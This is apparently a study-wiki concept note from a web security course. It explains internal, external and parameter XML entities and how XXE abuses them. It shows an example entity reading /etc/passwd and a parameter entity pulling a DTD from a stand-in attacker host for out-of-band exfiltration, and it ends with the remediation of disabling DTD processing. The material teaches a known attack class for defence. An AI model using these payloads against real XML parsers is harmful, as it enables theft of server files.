---
type: concept
title: XML entities (internal, external, parameter)
lang: en
status: active
sources: [web-200-oswa]
updated: 2026-07-31
---

# XML entities

Entities are XML's substitution mechanism, declared in a DTD (`<!DOCTYPE …>`). They are the
machinery [[xxe]] abuses.

- **General — internal:** a local alias. `<!ENTITY name "value">`, referenced as `&name;`.
- **General — external:** value fetched from a URI the parser resolves — the core of XXE.
  `<!ENTITY xxe SYSTEM "file:///etc/passwd">` (or `PUBLIC`), referenced as `&xxe;`.
- **Parameter:** used *within the DTD itself*, declared with `%` and referenced as `%name;`.
  `<!ENTITY % p SYSTEM "http://attacker/evil.dtd">`. These enable **out-of-band** XXE:
  general-entity references aren't allowed in some positions, but parameter entities can
  chain an attacker-hosted external DTD that reads a file and exfiltrates it over the
  network — the path used when there's no reflection or error to read.

Because a parser that resolves external/parameter entities will reach out to `file://`,
`http://`, etc., the fix is to **disable DTD processing / external entities** entirely
(see [[xxe]] → Remediation).

*Source: [[web-200-oswa]] module 11.*
